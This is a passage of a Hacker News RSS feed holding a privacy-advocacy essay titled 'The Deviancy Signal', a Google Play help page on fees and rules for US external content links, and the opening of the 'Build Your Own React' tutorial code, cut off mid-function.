						
							
		<dt>18 Jun 2005</dt>
	


<dd><p>Charles v2.0 released. Major enhancements and improvements.</p></dd>
						
					</div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[The Deviancy Signal: Having "Nothing to Hide" Is a Threat to Us All (169 pts)]]></title>
            <link>https://thompson2026.com/blog/deviancy-signal/</link>
            <guid>46333830</guid>
            <pubDate>Sat, 20 Dec 2025 05:24:21 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://thompson2026.com/blog/deviancy-signal/">https://thompson2026.com/blog/deviancy-signal/</a>, See on <a href="https://news.ycombinator.com/item?id=46333830">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
            <p>There's a special kind of contempt I reserve for the person who says, "I have nothing to hide." It's not the gentle pity you'd have for the naive. It's the cold, hard anger you hold for a collaborator. Because these people aren't just surrendering their own liberty. They're instead actively forging the chains for the rest of us. They are a threat, and I think it's time they were told so.</p>
<p>Their argument is a "pathology of the present tense," a failure of imagination so profound it borders on a moral crime. What they fail to understand is that by living as an open book, they are creating the most dangerous weapon imaginable: a baseline of "normalcy." They are steadily creating a data profile for the State's machine, teaching its algorithms what a "good, transparent citizen" looks like. Every unencrypted text, every thoughtless search, every location-tagged post is another brick in the wall of their own cage.</p>
<p>And then comes the part they can't (or won't) fathom. The context shifts. The political winds change. The Overton window slams shut on a belief they once held. A book they read is declared subversive. A group they donated to is re-classified as extremist. A joke they told is now evidence of a thoughtcrime. Suddenly, for the first time, they have something to hide.</p>
<p>So they reach for the tools of privacy. They download the encrypted messenger. They fire up the VPN. They start to cover their tracks.</p>
<p>And in that single act, they trigger the <strong>Deviancy Signal</strong>.</p>
<p>Their first attempt at privacy, set against their own self-created history of total transparency, is a screaming alarm to the grown surveillance machine. It's the poker player with a perfect tell, or the nocturnal animal suddenly walking in daylight. Their very attempt to become private is the most public and suspicious act they could possibly commit. They have not built an effective shield, as they have painted a target on their own back. By the time they need privacy, their own history has made seeking it an admission of guilt.</p>
<p>But the damage doesn't end with your own self-incrimination. It radiates outward, undoing the careful work of everyone around you. Think of your friend who has practiced perfect operational security, who has spent years building a private life to ensure they have no baseline for the state to analyze. They are a ghost in the machine. Then they talk to you. Your unshielded phone becomes the listening device they never consented to. You take their disciplined effort to stay invisible and you shout it into a government microphone, tying their identity to yours in a permanent, searchable log. You don't just contrast with their diligence; you actively dismantle it.</p>
<p>On a societal scale, this inaction becomes a collective betrayal. The power of the <strong>Deviancy Signal</strong> is directly proportional to the number of people who live transparently. Every person who refuses to practice privacy adds another gallon of clean, clear water to the state's pool, making any ripple of dissent ... any deviation ... starkly visible. This is not a passive choice. By refusing to help create a chaotic, noisy baseline of universal privacy, you are actively making the system more effective. You are failing to do your part to make the baseline all deviant, and in doing so, you make us all more vulnerable.</p>
<p>There is only one way to disarm this weapon: we must destroy its premise. We must obliterate the baseline. The task is not merely to hide, but to make privacy the default, to make encryption a reflex, to make anonymity a universal right. We must create so much noise that a signal is impossible to find. Our collective goal must be to make a "normal" profile so rare that the watchers have nothing to compare us to. <strong>We must all become deviations</strong>.</p>

        </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Android introduces $2-4 install fee and 10–20% cut for US external content links (199 pts)]]></title>
            <link>https://support.google.com/googleplay/android-developer/answer/16470497?hl=en</link>
            <guid>46333734</guid>
            <pubDate>Sat, 20 Dec 2025 05:00:55 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://support.google.com/googleplay/android-developer/answer/16470497?hl=en">https://support.google.com/googleplay/android-developer/answer/16470497?hl=en</a>, See on <a href="https://news.ycombinator.com/item?id=46333734">Hacker News</a></p>
<div id="readability-page-1" class="page"><div id="hcfe-content" role="main">                   <article class="page" sc-render-smart-button="false" itemscope=""> <div data-stats-ve="35"><div>
  <p>Developers currently using links to app downloads or transactions need to enroll in this program and meet these requirements by January 28, 2026.</p>
</div>

<div>
  <p><a id="in_the_future" name="in_the_future"></a>In the future, Google intends to apply a service fee on successful transactions and downloads completed via external content links. At this time, however, Google is not assessing these fees and is therefore not requiring developers in this program to report these transactions or downloads to Google.</p>
</div>

<p>The external content links program allows developers of Google Play-distributed apps to link users in the United States to external content, including to purchase in-app digital items or to download an app whose install and updates are not managed by Google Play. Additionally, developers can offer external links to purchase in-app digital items in lieu of or alongside Google Play Billing.</p>

<p>Developers must meet the eligibility and requirements set out below, and successfully complete their enrollment in this program prior to using external content links.<br>
  &nbsp;</p>

<h2>Availability</h2>

<p>This program is available in the US in connection with the <a href="https://support.google.com/googleplay/android-developer/answer/15582165" rel="noopener">US District Court's order</a>. Google reserves the right to modify or terminate this program, including as a result of any changes to or termination of the US District Court's order.</p>

<h2><a id="ecl_requirements" name="ecl_requirements"></a>Requirements</h2>

<p>Developers participating in this program must comply with the following requirements:</p>

<ul>
  <li>Enroll and get approval for your app(s) and any linked external apps in the external content links program as explained below.</li>
  <li>Limit external content links to users in the US and its territories.</li>
  <li>Ensure all Play Apps enrolled in this program and any linked external apps comply with <a href="https://play.google/developer-content-policy/" rel="noopener" target="_blank">Play Developer Policies</a>, with the exception of policies that are not applicable to linked apps, such as the <a href="https://support.google.com/googleplay/android-developer/answer/9858738" rel="noopener">Payments policy</a>.</li>
  <li>If using Google Play Billing with this program, all users must be able to access Google Play Billing in a consistent and reliable manner.</li>
  <li>Integrate with the external content links APIs, which surface&nbsp;an information screen, enable parental controls, and facilitate transaction reporting once required.</li>
  <li>Provide customer support for users completing transactions or downloading apps outside of Play and provide a process to dispute unauthorized transactions.</li>
  <li>Offer refund methods for users completing transactions outside of Play, unless the user was clearly informed that the transaction is non-refundable before completing the purchase.</li>
  <li>All external content links must meet the <a href="#destination_requirements" rel="noopener">destination requirements</a> as outlined below.</li>
  <li><a href="#in_the_future" rel="noopener">Once required</a>, pay Google the applicable fees for qualifying transactions or app installs that are concluded outside the app following the external content link as outlined below.</li>
</ul>

<h2><a id="destination_requirements" name="destination_requirements"></a><span>Destination requirements</span></h2>

<div>
  <p>All external content destinations must meet the following requirements:</p>

  <div>
    <ul>
      <li>External content links to purchase in-app offers can be shown on a browser, in a webview or another app store already installed on the user’s device.</li>
      <li>For user safety, external content links to download apps can link to the download of apps on a browser or another app store already installed on the user’s device. The destination page cannot contain any downloads that have not been approved for the ECL program.</li>
      <li>External content links must inform the user about the destination page and its purpose in the app before linking out.</li>
      <li>External content URLs must not contain a user’s personally identifiable information without sufficient security or encryption techniques in order to protect the user’s data.</li>
      <li>External content links must not redirect or mislead users to a different destination page than presented in your external link, or present other false or deceptive information.</li>
    </ul>
  </div>
</div>

<div>
  <p>In addition, to ensure a good user experience and keep Play’s users safe, any destination for links to download need to:</p>

  <div>
      <ul>
        <li>Have the right to distribute the apps available at the destination.</li>
        <li>Clearly and visibly publish details for the app that is to be downloaded. The app details must include at least app name, app icon, app description, app version number, app download size, and information about the app developer.</li>
        <li>Only install an app with the user’s knowledge and at the explicit direction of the user for each app, through a clearly labeled UI component visible to the user.</li>
        <li>Provide direct, publicly accessible customer support to end users through readily accessible communication channels.</li>
        <li>Have user data policies for their users.</li>
        <li>Be responsible for adhering to all applicable local regulations, laws and ordinances.</li>
      </ul>
    </div>
</div>

<h2><span>Play Ser</span><span>vice Fees</span></h2>

<div>
  <p>In the future, Google intends to apply a service fee on successful transactions and downloads completed via external content links. At this time, however, Google is not assessing these fees and is therefore not requiring developers in this program to report these transactions or downloads to Google.</p>
</div>

<p>Like our standard service fees, the fees associated with the external content links program reflect the <a href="https://play.google/howplayworks/" rel="noopener" target="_blank">value provided by Android and Play and support our continued investments across Android and Play</a>. The following fees apply when a user completes any transactions or any app installs <strong>within 24 hours of following an external content link</strong>:</p>

<ul>
  <li><strong>In-app item purchases</strong>: 10% for auto-renewing subscriptions and 20% for other offers of in-app digital features and services. Transactions for the first $1M (USD) of total developer earnings annually will be charged at 10%.</li>
  <li><strong>App download event</strong>: A fixed fee (subject to periodic adjustments) per install based on the app category of the linked external app being installed. The linked app category must be declared as part of transaction reporting.
    <ul>
      <li>Games: $3.65</li>
      <li>Apps: $2.85</li>
    </ul>
  </li>
</ul>

<h2>Eligibility</h2>

<p>In order to be eligible for this program, your app(s) must be a mobile or tablet app or game serving users in the United States and its territories.</p>

<p>Please note that eligibility and requirements are subject to change.</p>

<h2>Enroll your app in the external content links program</h2>

<p>To enroll in the external content links program, you must complete the following steps:</p>

<ol>
  <li>Review the requirements on this page to determine if your app(s) meets all the eligibility criteria.</li>
  <li>Complete the <a href="https://support.google.com/googleplay/android-developer/contact/external_content_links" rel="noopener">external content links declaration form</a> and complete any onboarding steps required to enroll in the program through Google's support team.</li>
  <li>Integrate the <a href="https://developer.android.com/google/play/billing/externalcontentlinks" rel="noopener" target="_blank">external links APIs</a> in your app for external links prior to linking users out to purchase in-app digital items or to download an external app.</li>
  <li>Enroll your app(s) that will be using external content links through Play Console on the <strong>External</strong> <strong>content</strong> <strong>links</strong> page (<strong>Settings</strong> &gt; <strong>External</strong> <strong>content</strong> <strong>links</strong>).</li>
  <li>If you are using external content links to link users to download an app, complete the following steps in Play Console:
    <div>
      <h2>a. Register and submit all versions of the linked external app(s)</h2>

      <div>
        <p>i. Open <a href="https://play.google.com/console/developers" rel="noopener" target="_blank">Play Console</a> and go to the Register external apps page (<strong>Settings</strong> &gt; <strong>Register</strong> <strong>external</strong> <strong>apps</strong>).</p>

        <p>ii. External apps submitted for registration are processed as soon as possible, subject to our standard review processes, and may result in review times of up to 7 days or longer in exceptional cases.</p>
      </div>
    </div>

    <div>
      <p>b. Declare all external content links to external app(s) in your Play app(s)</p>

      <div>
          <p>i. Open <a href="https://play.google.com/console/developers" rel="noopener" target="_blank">Play Console</a> and go to the External apps declaration (<strong>Monitor and improve</strong> &gt; <strong>Policy and programs</strong> &gt; <strong>App Content</strong>).</p>

          <p>ii. Input the package name of the external app. Note: only external apps that have been successfully registered will show up in the drop-down list. See <a href="#why_cant_I_select_the_external_app_when_declaring_external_content_links" rel="noopener">this FAQ</a> for more information.</p>

          <p>iii. Provide all user facing landing page URLs for the external app downloads.</p>

          <p>iv. Provide all download links that are being used to distribute the external app APK to users.</p>
        </div>
    </div>

    <div>
      <h2>c. When your external app(s) are updated, submit all updated versions and APKs of the linked external app(s)</h2>

      <div>
          <p>i. Open <a href="https://play.google.com/console/developers" rel="noopener" target="_blank">Play Console</a> and go to the Register external apps page (<strong>Settings</strong> &gt; <strong>Register</strong> <strong>external</strong> <strong>apps</strong>).</p>

          <p>ii. Find the external app that is being updated and click <strong>Manage</strong> in the table.</p>

          <p>iii. Ensure the external app is approved before linking users to the updated versions or APKs.</p>
        </div>
    </div>
  </li>
  <li>
    <p><a href="#in_the_future" rel="noopener">Once required</a>, keep track of all transactions, including $0 transactions resulting from free trial purchases, and app installs completed through external content links for reporting through the <a href="https://developer.android.com/google/play/billing/externalcontentlinks" rel="noopener" target="_blank">external links APIs</a>.</p>
  </li>
</ol>

<p>If you have any additional questions, you can contact our support team <a href="https://support.google.com/googleplay/android-developer/contact/billing_and_linkouts_program_q" rel="noopener">here</a>.</p>

<p><a href="https://support.google.com/googleplay/android-developer/contact/external_content_links" target="_blank" rel="noopener">Open declaration form</a></p>

<h2><a id="ecl_program_faq" name="ecl_program_faq"></a>Frequently asked questions</h2>

<div>
  <p>Can I utilize external content links for users in other geographies beyond the US?</p>

  <div>
    <p>This program is limited to users in the United States and its territories. Developers from other regions can enroll in the program to offer external links to users in the United States and its territories. If you are looking to offer external content links for users in the EEA, you will need to enroll in the <a href="https://support.google.com/googleplay/android-developer/answer/12570971" rel="noopener">External Offers Program</a>.</p>
  </div>
</div>

<div>
  <p>Are game developers eligible for this program?</p>

  <div>
    <p>Yes, both game and app developers are eligible to apply and participate in the external content links program.</p>
  </div>
</div>

<div>
  <p>Are all developers required to enroll in the external content links program?</p>

  <div>
    <p>No, this is an optional program. If you do not wish to link users to external content for purchases or downloads, no action is required.</p>
  </div>
</div>

<div>
  <p>Is there a limit to the number of external content links I am allowed to have in my app?</p>

  <div>
    <p>No, there is no limit on the number of external content links in your app.</p>
  </div>
</div>

<div>
  <p>What types of transactions are we required to report when using external content links to link users to purchase in-app digital items?</p>

  <div>
    <p>Once required, you will need to report all transactions, including $0 transactions resulting from free trial purchases, that are concluded after following an external content link. This applies to all transactions, including new purchases, rentals, renewals, top-ups, upgrades, downgrades, and others. Please see the external links integration guide for how to report these transactions.</p>
  </div>
</div>

<div>
  <p><a id="why_cant_I_select_the_external_app_when_declaring_external_content_links" name="why_cant_I_select_the_external_app_when_declaring_external_content_links"></a>Why can’t I select the external app when declaring external content links in the Play Console?</p>

  <div>
    <p>External apps must be successfully registered before you can declare the external content links that link users to an external app download. Please make sure that the external app has been submitted for registration and addressed any issues that may have been identified during the registration and review process. You can check to see if there are any issues in <a href="https://play.google.com/console/developers" rel="noopener" target="_blank">Play Console</a> on the <strong>Publishing</strong> <strong>overview</strong> page before you submit your external app registration or on the <strong>Policy</strong> <strong>status</strong> page after you have submitted your external app for review.</p>
  </div>
</div>

<div>
  <p>Do I have to register the external apps that I link to?</p>

  <div>
    <p>Yes, registration of all external apps on the linked destination page is required. This process enables Google to check that all external apps linked to using external content links are compliant with <a href="https://play.google/developer-content-policy/" rel="noopener" target="_blank">Play Developer Policies</a>, with the exception of policies that are not applicable to linked apps, such as the <a href="https://support.google.com/googleplay/android-developer/answer/9858738" rel="noopener">Payment policies</a>.</p>
  </div>
</div>

<div>
  <p>Can I make external content links available for only some of my apps?</p>

  <div>
    <p>Yes, after successfully signing up to the external content links program, you can select which apps you want to enroll for external content links at any given time using the Play Console.</p>
  </div>
</div>

<div>
  <p>How can I notify Google of any changes to my app package enrollment selections?</p>

  <div>
    <p>You can change the external content link program enrollment for a given app package through your <a href="https://developer.android.com/google/play/billing/alternative#configuring-with-user-choice" rel="noopener" target="_blank">Play Console settings</a>. Any updates will be effective immediately, including changes to applicable service fees.</p>
  </div>
</div>

<div>
  <h2>What are the steps to integrate with the external links APIs?</h2>

  <div>
    <p>It is easy to extend your existing integration with Google Play’s billing system to utilize external links APIs. The APIs are built upon the same design patterns and principles as our Play Billing Library and Play Developer APIs. This means they are compatible with your existing designs and will be familiar to your teams. In our developer integration guide, we provide detailed guidelines and resources on how to get started. We welcome developer feedback on these APIs and any additional resources that would be helpful.</p>

    <p>If you have any questions or feedback about the external links APIs, please contact us <a href="https://support.google.com/googleplay/android-developer/contact/billing_and_linkouts_program_q" rel="noopener">here</a>.</p>
  </div>
</div>

<div>
  <p>If I am already participating in an alternative billing program, can I also participate in the external content links program?</p>

  <div>
    <p>Yes, developers can take advantage of both programs if they so choose and if they satisfy requirements of both programs and meet the eligibility criteria for both. To participate in the external content links program and start promoting external links, you need to successfully complete the signup process and comply with all the program requirements.</p>
  </div>
</div>

<div>
  <p>Can I use Google Play's billing system alongside external content links?</p>

  <div>
    <p>Yes, developers can take advantage of Google Play's billing system while also participating in the external content links program. To participate in the external content links program and start promoting external links, you need to successfully complete the signup process and comply with all the program requirements.</p>
  </div>
</div>
</div>         <div data-stats-id="16470497" data-stats-ve="20" data-stats-visible-imp="" id="article-survey-container"><h2 tabindex="-1">Was this helpful?</h2><p>How can we improve it?</p></div>    </article>            </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Build Your Own React (151 pts)]]></title>
            <link>https://pomb.us/build-your-own-react/</link>
            <guid>46332526</guid>
            <pubDate>Sat, 20 Dec 2025 00:16:13 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://pomb.us/build-your-own-react/">https://pomb.us/build-your-own-react/</a>, See on <a href="https://news.ycombinator.com/item?id=46332526">Hacker News</a></p>
<div id="readability-page-1" class="page"><div><pre><code><div><p><span>function</span><span> </span><span>createElement</span><span>(</span><span>type</span><span>,</span><span> props</span><span>,</span><span> </span><span>...</span><span>children</span><span>)</span><span> </span><span>{</span></p></div><div><p><span>  </span><span>return</span><span> </span><span>{</span></p></div><div><p><span>    type</span><span>,</span></p></div><div><p><span>    </span><span>props</span><span>:</span><span> </span><span>{</span></p></div><div><p><span>      </span><span>...</span><span>props</span><span>,</span></p></div><div><p><span>      </span><span>children</span><span>:</span><span> children</span><span>.</span><span>map</span><span>(</span><span>child</span><span> </span><span>=&gt;</span></p></div><div><p><span>        </span><span>typeof</span><span> child </span><span>===</span><span> </span><span>"object"</span></p></div><div><p><span>          </span><span>?</span><span> child</span></p></div><div><p><span>          </span><span>:</span><span> </span><span>createTextElement</span><span>(</span><span>child</span><span>)</span></p></div><div><p><span>      </span><span>)</span><span>,</span></p></div><div><p><span>    </span><span>}</span><span>,</span></p></div><div><p><span>  </span><span>}</span></p></div><div><p><span>}</span></p></div><div><p><span>​</span></p></div><div><p><span>function</span><span> </span><span>createTextElement</span><span>(</span><span>text</span><span>)</span><span> </span><span>{</span></p></div><div><p><span>  </span><span>return</span><span> </span><span>{</span></p></div><div><p><span>    </span><span>type</span><span>:</span><span> </span><span>"TEXT_ELEMENT"</span><span>,</span></p></div><div><p><span>    </span><span>props</span><span>:</span><span> </span><span>{</span></p></div><div><p><span>      </span><span>nodeValue</span><span>:</span><span> text</span><span>,</span></p></div><div><p><span>      </span><span>children</span><span>:</span><span> </span><span>[</span><span>]</span><span>,</span></p></div><div><p><span>    </span><span>}</span><span>,</span></p></div><div><p><span>  </span><span>}</span></p></div><div><p><span>}</span></p></div><div><p><span>​</span></p></div><div><p><span>function</span><span> </span><span>createDom</span><span>(</span><span>fiber</span><span>)</span><span> </span><span>{</span></p></div><div><p><span>  </span><span>const</span><span> dom </span><span>=</span></p></div><div><p><span>    fiber</span><span>.</span><span>type </span><span>==</span><span> </span><span>"TEXT_ELEMENT"</span></p></div><div><p><span>      </span><span>?</span><span> document</span><span>.</span><span>createTextNode</span><span>(</span><span>""</span><span>)</span></p></div><div><p><span>      </span><span>:</span><span> document</span><span>.</span><span>createElement</span><span>(</span><span>fiber</span><span>.</span><span>type</span><span>)</span></p></div><div><p><span>​</span></p></div><div><p><span>  </span><span>updateDom</span><span>(</span><span>dom</span><span>,</span><span> </span><span>{</span><span>}</span><span>,</span><span> fiber</span><span>.</span><span>props</span><span>)</span></p></div><div><p><span>​</span></p></div><div><p><span>  </span><span>return</span><span> dom</span></p></div><div><p><span>}</span></p></div><div><p><span>​</span></p></div><div><p><span>const</span><span> </span><span>isEvent</span><span> </span><span>=</span><span> </span><span>key</span><span> </span><span>=&gt;</span><span> key</span><span>.</span><span>startsWith</span><span>(</span><span>"on"</span><span>)</span></p></div><div><p><span>const</span><span> </span><span>isProperty</span><span> </span><span>=</span><span> </span><span>key</span><span> </span><span>=&gt;</span></p></div><div><p><span>  key </span><span>!==</span><span> </span><span>"children"</span><span> </span><span>&amp;&amp;</span><span> </span><span>!</span><span>isEvent</span><span>(</span><span>key</span><span>)</span></p></div><div><p><span>const</span><span> </span><span>isNew</span><span> </span><span>=</span><span> </span><span>(</span><span>prev</span><span>,</span><span> next</span><span>)</span><span> </span><span>=&gt;</span><span> </span><span>key</span><span> </span><span>=&gt;</span></p></div><div><p><span>  prev</span><span>[</span><span>key</span><span>]</span><span> </span><span>!==</span><span> next</span><span>[</span><span>key</span><span>]</span></p></div><div><p><span>const</span><span> </span><span>isGone</span><span> </span><span>=</span><span> </span><span>(</span><span>prev</span><span>,</span><span> next</span><span>)</span><span> </span><span>=&gt;</span><span> </span><span>key</span><span> </span><span>=&gt;</span><span> </span><span>!</span><span>(</span><span>key </span><span>in</span><span> next</span><span>)</span></p></div><div><p><span>function</span><span> </span><span>updateDom</span><span>(</span><span>dom</span><span>,</span><span> prevProps</span><span>,</span><span> nextProps</span><span>)</span><span> </span><span>{</span></p></div><div><p><span>  </span><span>//Remove old or changed event listeners</span></p></div><div><p><span>  Object</span><span>.</span><span>keys</span><span>(</span><span>prevProps</span><span>)</span></p></div><div><p><span>    </span><span>.</span><span>filter</span><span>(</span><span>isEvent</span><span>)</span></p></div><div><p><span>    </span><span>.</span><span>filter</span><span>(</span></p></div><div><p><span>      </span><span>key</span><span> </span><span>=&gt;</span></p></div><div><p><span>        </span><span>!</span><span>(</span><span>key </span><span>in</span><span> nextProps</span><span>)</span><span> </span><span>||</span></p></div><div><p><span>        </span><span>isNew</span><span>(</span><span>prevProps</span><span>,</span><span> nextProps</span><span>)</span><span>(</span><span>key</span><span>)</span></p></div><div><p><span>    </span><span>)</span></p></div><div><p><span>    </span><span>.</span><span>forEach</span><span>(</span><span>name</span><span> </span><span>=&gt;</span><span> </span><span>{</span></p></div><div><p><span>      </span><span>const</span><span> eventType </span><span>=</span><span> name</span></p></div><div><p><span>        </span><span>.</span><span>toLowerCase</span><span>(</span><span>)</span></p></div><div><p><span>        </span><span>.</span><span>substring</span><span>(</span><span>2</span><span>)</span></p></div><div><p><span>      dom</span><span>.</span><span>removeEventListener</span><span>(</span></p></div><div><p><span>        eventType</span><span>,</span></p></div><div><p><span>        prevProps</span><span>[</span><span>name</span><span>]</span></p></div><div><p><span>      </span><span>)</span></p></div><div><p><span>    </span><span>}</span><span>)</span></p></div><div><p><span>​</span></p></div><div><p><span>  </span><span>// Remove old properties</span></p></div><div><p><span>  Object</span><span>.</span><span>keys</span><span>(</span><span>prevProps</span><span>)</span></p></div><div><p><span>    </span><span>.</span><span>filter</span><span>(</span><span>isProperty</span><span>)</span></p></div><div><p><span>    </span><span>.</span><span>filter</span><span>(</span><span>isGone</span><span>(</span><span>prevProps</span><span>,</span><span> nextProps</span><span>)</span><span>)</span></p></div><div><p><span>    </span><span>.</span><span>forEach</span><span>(</span><span>name</span><span> </span><span>=&gt;</span><span> </span><span>{</span></p></div><div><p><span>      dom</span><span>[</span><span>name</span><span>]</span><span> </span><span>=</span><span> </span><span>""</span></p></div><div><p><span>    </span><span>}</span><span>)</span></p></div><div><p><span>​</span></p></div><div><p><span>  </span><span>// Set new or changed properties</span></p></div><div><p><span>  Object</span><span>.</span><span>keys</span><span>(</span><span>nextProps</span><span>)</span></p></div><div><p><span>    </span><span>.</span><span>filter</span><span>(</span><span>isProperty</span><span>)</span></p></div><div><p><span>    </span><span>.</span><span>filter</span><span>(</span><span>isNew</span><span>(</span><span>prevProps</span><span>,</span><span> nextProps</span><span>)</span><span>)</span></p></div><div><p><span>    </span><span>.</span><span>forEach</span><span>(</span><span>name</span><span> </span><span>=&gt;</span><span> </span><span>{</span></p></div><div><p><span>      dom</span><span>[</span><span>name</span><span>]</span><span> </span><span>=</span><span> nextProps</span><span>[</span><span>name</span><span>]</span></p></div><div><p><span>    </span><span>}</span><span>)</span></p></div><div><p><span>​</span></p></div><div><p><span>  </span><span>// Add event listeners</span></p></div><div><p><span>  Object</span><span>.</span><span>keys</span><span>(</span><span>nextProps</span><span>)</span></p></div><div><p><span>    </span><span>.</span><span>filter</span><span>(</span><span>isEvent</span><span>)</span></p></div><div><p><span>    </span><span>.</span><span>filter</span><span>(</span><span>isNew</span><span>(</span><span>prevProps</span><span>,</span><span> nextProps</span><span>)</span><span>)</span></p></div><div><p><span>    </span><span>.</span><span>forEach</span><span>(</span><span>name</span><span> </span><span>=&gt;</span><span> </span><span>{</span></p></div><div><p><span>      </span><span>const</span><span> eventType </span><span>=</span><span> name</span></p></div><div><p><span>        </span><span>.</span><span>toLowerCase</span><span>(</span><span>)</span></p></div><div><p><span>        </span><span>.</span><span>substring</span><span>(</span><span>2</span><span>)</span></p></div><div><p><span>      dom</span><span>.</span><span>addEventListener</span><span>(</span></p></div><div><p><span>        eventType</span><span>,</span></p></div><div><p><span>        nextProps</span><span>[</span><span>name</span><span>]</span></p></div><div><p><span>      </span><span>)</span></p></div><div><p><span>    </span><span>}</span><span>)</span></p></div><div><p><span>}</span></p></div><div><p><span>​</span></p></div><div><p><span>function</span><span> </span><span>commitRoot</span><span>(</span><span>)</span><span> </span><span>{</span></p></div><div><p><span>  deletions</span><span>.</span><span>forEach</span><span>(</span><span>commitWork</span><span>)</span></p></div><div><p><span>  </span><span>commitWork</span><span>(</span><span>wipRoot</span><span>.</span><span>child</span><span>)</span></p></div><div><p><span>  currentRoot </span><span>=</span><span> wipRoot</span></p></div><div><p><span>  wipRoot </span><span>=</span><span> </span><span>null</span></p></div><div><p><span>}</span></p></div><div><p><span>​</span></p></div><div><p><span>function</span><span> </span><span>commitWork</span><span>(</span><span>fiber</span><span>)</span><span> </span><span>{</span></p></div><div><p><span>  </span><span>if</span><span> </span><span>(</span><span>!</span><span>fiber</span><span>)</span><span> </span><span>{</span></p></div><div><p><span>    </span><span>return</span></p></div><div><p><span>  </span><span>}</span></p></div><div><p><span>​</span></p></div><div><p><span>  </span><span>const</span><span> domParent </span><span>=</span><span> fiber</span><span>.</span><span>parent</span><span>.</span><span>dom</span></p></div><div><p><span>  </span><span>if</span><span> </span><span>(</span></p></div><div><p><span>    fiber</span><span>.</span><span>effectTag </span><span>===</span><span> </span><span>"PLACEMENT"</span><span> </span><span>&amp;&amp;</span></p></div><div><p><span>    fiber</span><span>.</span><span>dom </span><span>!=</span><span> </span><span>null</span></p></div><div><p><span>  </span><span>)</span><span> </span><span>{</span></p></div><div><p><span>    domParent</span><span>.</span><span>appendChild</span><span>(</span><span>fiber</span><span>.</span><span>dom</span><span>)</span></p></div><div><p><span>  </span><span>}</span><span> </span><span>else</span><span> </span><span>if</span><span> </span><span>(</span></p></div><div><p><span>    fiber</span><span>.</span><span>effectTag </span><span>===</span><span> </span><span>"UPDATE"</span><span> </span><span>&amp;&amp;</span></p></div><div><p><span>    fiber</span><span>.</span><span>dom </span><span>!=</span><span> </span><span>null</span></p></div><div><p><span>  </span><span>)</span><span> </span><span>{</span></p></div><div><p><span>    </span><span>updateDom</span><span>(</span></p></div><div><p><span>      fiber</span><span>.</span><span>dom</span><span>,</span></p></div><div><p><span>      fiber</span><span>.</span><span>alternate</span><span>.</span><span>props</span><span>,</span></p></div><div><p><span>      fiber</span><span>.</span><span>props</span></p></div><div><p><span>    </span><span>)</span></p></div><div><p><span>  </span><span>}</span><span> </span><span>else</span><span> </span><span>if</span><span> </span><span>(</span><span>fiber</span><span>.</span><span>effectTag </span><span>===</span><span> </span><span>"DELETION"</span><span>)</span><span> </span><span>{</span></p></div><div><p><span>    domParent</span><span>.</span><span>removeChild</span><span>(</span><span>fiber</span><span>.</span><span>dom</span><span>)</span></p></div><div><p><span>  </span><span>}</span></p></div><div><p><span>​</span></p></div><div><p><span>  </span><span>commitWork</span><span>(</span><span>fiber</span><span>.</span><span>child</span><span>)</span></p></div><div><p><span>  </span><span>commitWork</span><span>(</span><span>fiber</span><span>.</span><span>sibling</span><span>)</span></p></div><div><p><span>}</span></p></div><div><p><span>​</span></p></div><div><p><span>function</span><span> </span><span>render</span><span>(</span><span>element</span><span>,</span><span> container</span><span>)</span><span> </span><span>{</span></p></div><div><p><span>  wipRoot </span><span>=</span><span> </span><span>{</span></p></div><div><p><span>    </span><span>dom</span><span>:</span><span> container</span><span>,</span></p></div><div><p><span>    </span><span>props</span><span>:</span><span> </span><span>{</span></p></div><div><p><span>      </span><span>children</span><span>:</span><span> </span><span>[</span><span>element</span><span>]</span><span>,</span></p></div><div><p><span>    </span><span>}</span><span>,</span></p></div><div><p><span>    </span><span>alternate</span><span>:</span><span> currentRoot</span><span>,</span></p></div><div><p><span>  </span><span>}</span></p></div><div><p><span>  deletions </span><span>=</span><span> </span><span>[</span><span>]</span></p></div><div><p><span>  nextUnitOfWork </span><span>=</span><span> wipRoot</span></p></div><div><p><span>}</span></p></div><div><p><span>​</span></p></div><div><p><span>let</span><span> nextUnitOfWork </span><span>=</span><span> </span><span>null</span></p></div><div><p><span>let</span><span> currentRoot </span><span>=</span><span> </span><span>null</span></p></div><div><p><span>let</span><span> wipRoot </span><span>=</span><span> </span><span>null</span></p></div><div><p><span>let</span><span> deletions </span><span>=</span><span> </span><span>null</span></p></div><div><p><span>​</span></p></div><div><p><span>function</span><span> </span><span>workLoop</span><span>(</span><span>deadline</span><span>)</span><span> </span><span>{</span></p></div><div><p><span>  </span><span>let</span><span> shouldYield </span><span>=</span><span> </span><span>false</span></p></div><div><p><span>  </span><span>while</span><span> </span><span>(</span><span>nextUnitOfWork </span><span>&amp;&amp;</span><span> </span><span>!</span><span>shouldYield</span><span>)</span><span> </span><span>{</span></p></div><div><p><span>    nextUnitOfWork </span><span>=</span><span> </span><span>performUnitOfWork</span><span>(</span></p></div><div><p><span>      nextUnitOfWork</span></p></div><div><p><span>    </span><span>)</span></p></div><div><p><span>    shouldYield </span><span>=</span><span> deadline</span><span>.</span><span>timeRemaining</span><span>(</span><span>)</span><span> </span><span>&lt;</span><span> </span><span>1</span></p></div><div><p><span>  </span><span>}</span></p></div><div><p><span>​</span></p></div><div><p><span>  </span><span>if</span><span> </span><span>(</span><span>!</span><span>nextUnitOfWork </span><span>&amp;&amp;</span><span> wipRoot</span><span>)</span><span> </span><span>{</span></p></div><div><p><span>    </span><span>commitRoot</span><span>(</span><span>)</span></p></div><div><p><span>  </span><span>}</span></p></div><div><p><span>​</span></p></div><div><p><span>  </span><span>requestIdleCallback</span><span>(</span><span>workLoop</span><span>)</span></p></div><div><p><span>}</span></p></div><div><p><span>​</span></p></div><div><p><span>requestIdleCallback</span><span>(</span><span>workLoop</span><span>)</span></p></div><div><p><span>​</span></p></div><div><p><span>function</span><span> </span><span>performUnitOfWork</span><span>(</span><span>fiber</span><span>)</span><span> </span><span>{</span></p></div><div><p><span>  </span><span>if</span><span> </span><span>(</span><span>!</span><span>fiber</span><span>.</span><span>dom</span><span>)</span><span> </span><span>{</span></p></div><div><p><span>    fiber</span><span>.</span><span>dom </span><span>=</span><span> </span><span>createDom</span><span>(</span><span>fiber</span><span>)</span></p></div><div><p><span>  </span><span>}</span></p></div><div><p><span>​</span></p></div><div><p><span>  </span><span>const</span><span> elements 